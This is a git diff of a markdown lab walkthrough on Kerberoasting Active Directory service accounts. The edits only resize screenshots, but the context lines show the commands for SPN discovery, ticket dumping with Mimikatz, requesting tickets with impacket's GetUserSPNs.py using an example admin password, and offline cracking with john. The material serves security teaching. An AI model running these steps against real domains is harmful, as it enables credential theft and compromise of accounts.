@@ -58,9 +58,9 @@ Import-Module .\Find-PotentiallyCrackableAccounts.ps1
 Find-PotentiallyCrackableAccounts -FullData -Verbose
 ```
 
-<img src="/img/kerberosting/11.png" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/11.png" alt="Getting-gz" width="1000" height="200"> 
 
-<img src="/img/kerberosting/12.png" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/12.png" alt="Getting-gz" width="1000" height="200"> 
 
 
 ## GetUserSPNs.ps1
@@ -72,7 +72,7 @@ download script: https://raw.githubusercontent.com/nidem/kerberoast/master/GetUs
 ```
 
 
-<img src="/img/kerberosting/13.png" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/13.png" alt="Getting-gz" width="1000" height="200"> 
 
 
 ## TGSCipher.ps1
@@ -86,27 +86,27 @@ download script:https://raw.githubusercontent.com/cyberark/RiskySPN/master/Get-T
  Get-TGSCipher -SPN "MSSQLSvc/domainAD.karim.net:1443" -Format John
  ```
  
- <img src="/img/kerberosting/14.PNG" alt="Getting-gz" width="800" height="200"> 
+ <img src="/img/kerberosting/14.PNG" alt="Getting-gz" width="1000" height="200"> 
 
  
  ## Mimikatz
  
- <img src="/img/kerberosting/m1.PNG" alt="Getting-gz" width="800" height="200"> 
+ <img src="/img/kerberosting/m1.PNG" alt="Getting-gz" width="1000" height="200"> 
 
  ```
  Kerberos::list  ## for SPN discovery.
  ```
 
-<img src="/img/kerberosting/m2.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/m2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 Dump TGS ticket
 ```
 kerberos::list /export
 ```
 
-<img src="/img/kerberosting/m2.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/m2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
-<img src="/img/kerberosting/m3.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/m3.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 
 ## kirbi2john.py 
@@ -131,7 +131,7 @@ python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140
 python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request     
 ```
 
-<img src="/img/kerberosting/error.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/error1.PNG" alt="Getting-gz" width="800" height="300"> 
 
 if you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: ntpdate <IP of DC>
 
@@ -147,10 +147,9 @@ python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request-
 ```
   
 <img src="/img/kerberosting/2.PNG" alt="Getting-gz" width="1000" height="300"> 
-
   
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt tgs
 ```
   
-<img src="/img/kerberosting/john.PNG" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/kerberosting/john.PNG" alt="Getting-gz" width="1000" height="300"> 
